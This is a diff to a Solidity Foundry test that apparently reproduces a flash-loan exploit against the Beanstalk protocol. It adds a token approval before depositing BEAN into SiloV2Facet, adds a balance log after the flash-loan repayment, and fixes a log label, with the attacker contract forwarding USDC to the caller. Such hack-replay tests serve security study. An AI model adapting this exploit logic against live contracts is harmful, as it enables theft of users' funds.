@@ -51,6 +51,7 @@ contract ContractTest is DSTest {
       "After initial ETH -> BEAN swap, Bean balance of attacker:",
       bean.balanceOf(address(this)) / 1e6
     );
+    bean.approve(address(siloV2Facet), type(uint256).max);
     siloV2Facet.depositBeans(bean.balanceOf(address(this)));
     emit log_named_uint(
       "After BEAN deposit to SiloV2Facet, Bean balance of attacker:",
@@ -113,6 +114,10 @@ contract ContractTest is DSTest {
       new bytes(0),
       0
     );
+    emit log_named_uint(
+      "After Flashloan repay, usdc balance of attacker:",
+      usdc.balanceOf(address(this))
+    );
     usdc.transfer(msg.sender, usdc.balanceOf(address(this)));
   }
 
@@ -141,7 +146,7 @@ contract ContractTest is DSTest {
       crvbean.balanceOf(address(this))
     );
     emit log_named_uint(
-      "After  , Curvebean3Crv_f balance of attacker:",
+      "After Curvebean3Crv_f balance of attacker:",
       IERC20(address(bean3Crv_f)).balanceOf(address(this))
     ); //@note logging balance for same token ?
     siloV2Facet.deposit(
